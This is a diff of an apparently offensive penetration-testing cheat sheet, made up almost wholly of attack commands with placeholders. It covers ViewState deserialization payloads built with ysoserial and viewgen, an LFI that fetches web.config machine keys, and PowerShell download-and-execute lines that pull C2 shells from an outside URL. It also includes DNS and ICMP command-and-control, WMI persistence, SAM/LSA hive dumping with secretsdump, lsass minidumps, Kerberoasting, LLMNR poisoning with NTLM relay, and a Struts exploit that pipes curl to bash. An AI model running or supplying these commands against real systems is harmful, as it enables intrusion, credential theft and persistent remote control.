@@ -2,7 +2,7 @@
 ```txt
 	# setting up, socks, port forwarding for payload delivery
 	ssh -f -N -D <LOCALIP>:<LOCALPORT> root@<REMOTEIP> # from local box
-	socat TCP-LISTEN:<LOCALPORT>,bind=<LOCALIP>,fork,reuseaddr TCP:<REMOTEIP>:<REMOTEPORT> # from redirector
+	socat TCP-LISTEN:<LOCALPORT>,bind=<LOCALIP>,fork,reuseaddr TCP:<REMOTEIP>:<REMOTEPORT> # from redirector (port 445, 80, 443)
 
 	# serving via http
 	python -m SimpleHTTPServer <LPORT>
@@ -239,17 +239,18 @@
 
 	ysoserial.exe -p ViewState  -g TextFormattingRunProperties -c "powershell.exe -exec bypass -noninteractive -windowstyle hidden -c iex((new-object system.net.webclient).downloadstring('<URL>/c2_icmp_shell.ps1'))" --path="/content/default.aspx" --apppath="/" --decryptionalg="AES" --decryptionkey="<DECRYPTIONKEY>"  --validationalg="SHA1" --validationkey="<VALIDATIONKEY>"
 
-	# initial access
+	# lfi for web.config with machine keys, viewgen to generate payload
+	proxychains wget http://<FQDN>:<PORT>/Home/DownloadFile?file=`%2FWeb.config -O web.confg
+	viewgen --webconfig web.config -m <__VIEWSTATEGENERATORVALUE> -c "powershell.exe -exec bypass -noninteractive -windowstyle hidden -c iex((new-object net.webclient).downloadstring('<URL>/c2_icmp_shell.ps1'))"
+	
+	# initial access via viewstate payload
 	proxychains curl -sv 'http://<URL>/Content/default.aspx' \  
 	  -H 'Connection: keep-alive' \
 	  -H 'Content-Type: application/x-www-form-urlencoded' \
 	  -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)' \
 	  -H 'Accept: */*' \
 	  -H 'Accept-Language: en-US,en;q=0.9' \
-	  --data-raw '__EVENTTARGET=ddlReqType&__EVENTARGUMENT=&__LASTFOCUS=&__VIEWSTATE=<URLENCODEDPAYLOAD>&__VIEWSTATEGENERATOR=<VIEWSTATEGENERATOR>&__EVENTVALIDATION=<VALIDATIONBASE64>&ddlReqType=Create' 2>&1
-	  
-	# with compromised web.configs from internal boxes (alternative)
-	proxychains viewgen --webconfig web.config -m <__VIEWSTATEGENERATORVALUE> -c "powershell.exe -exec bypass -noninteractive -windowstyle hidden -c iex((new-object system.net.webclient).downloadstring('<URL>/c2_icmp_shell.ps1'))"
+	  --data-raw '__EVENTTARGET=ddlReqType&__EVENTARGUMENT=&__LASTFOCUS=&__VIEWSTATE=<URLENCODEDPAYLOAD>&__VIEWSTATEGENERATOR=<VIEWSTATEGENERATOR>&__EVENTVALIDATION=<VALIDATIONBASE64>&ddlReqType=Create' 2>&1	  	
 	
 	# connect to compromised target via icmp, http, or just tcp...
 	echo 1> /proc/sys/net/ipv4/icmp_echo_ignore_all 
@@ -278,9 +279,12 @@
 	
 	# persistence, c2 via icmp, http, post exploitation
 	download_file /tmp/web.config c:/inetpub/wwwroot/css/web.config
-	(new-object net.webclient).downloadstring('<URL>/web.config')|out-file -encoding ascii -filepath c:\inetpub\wwwroot\css\web.config	
+	(new-object net.webclient).downloadstring('<URL>/web.config')|out-file -encoding ascii -filepath c:\inetpub\wwwroot\css\web.config		
 	iex(iwr http(s)://<URL>/icmp_server.ps1); invoke-shell
-	iex(iwr http(s)://<URL>/http_server.ps1); invoke-shell
+	iex(iwr http(s)://<URL>/http_server.ps1); invoke-shell	
+	ruby ./dnscat2.rb -e open --no-cache --dns=port=<LPORT>,domain=<C2DOMAIN>
+	powercat -c <C2IP> -p <DNSPORT> -dns <C2DOMAIN> -ep 
+	
 	InstallWMIPersistence <EventFilterName> <EventConsumerName>
 	SetFallbackNetwork <PRIMARYIP> <IPSUBNET>
 	InstallPersistence 1
@@ -320,6 +324,12 @@
 	invoke_binary Invoke-Mimikittenz.exe	
 	invoke_file /tmp/Invoke-PowerDump.ps1
 	Invoke-PowerDump
+	
+	# lsa secrets via hives
+	C:\> reg.exe save hklm\sam c:\temp\sam.save
+	C:\> reg.exe save hklm\security c:\temp\security.save
+	C:\> reg.exe save hklm\system c:\temp\system.save
+	python secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
 	
 	# looting lsass via minidumps, cover tracks
 	invoke_file /tmp/Out-Minidump.ps1
@@ -416,6 +426,10 @@
 	proxychains GetNPUsers.py -outputfile <TARGET>_spns.txt -no-pass <DOMAIN/USER>
 	proxychains GetUserSPNs.py -target-domain <TARGET> -outputfile <TARGET>_spns.txt -no-pass -hashes <HASHES> -dc-ip <DCIP> <DOMAIN/USER>
 	hashcat -m 13100 -a 0 <SPNSFILE> <DICTIONARY> --force
+	
+	# llmnr, nbns, wpad poisoning, ntlm relay
+	Invoke-Inveigh -HTTP N -NBNS -Y
+	Invoke-InveighRelay -ConsoleOutput Y -Target <IP> -Command  "<COMMAND>"
 ```
 ###### 9.) Windows domain based privesc, unconstrained.
 ```txt	
@@ -508,7 +522,7 @@
 ###### 11.) Lateral movement via exploitation.
 ```txt
 	# struts 2-59 exploit 
-	proxychains struts_cve-2020-0230.py -target http://<SERVER>/index.action -command 'curl --insecure -sv https://<IP>/shell.sh|bash -'
+	proxychains struts_cve-2019-0230.py -target http://<SERVER>/index.action -command 'curl --insecure -sv https://<IP>/shell.sh|bash -'
 
 	# exchange exploit
 	proxychains exchange_scanner_cve-2020-0688.py -s <SERVER> -u <USER> -p <PASSWORD> 
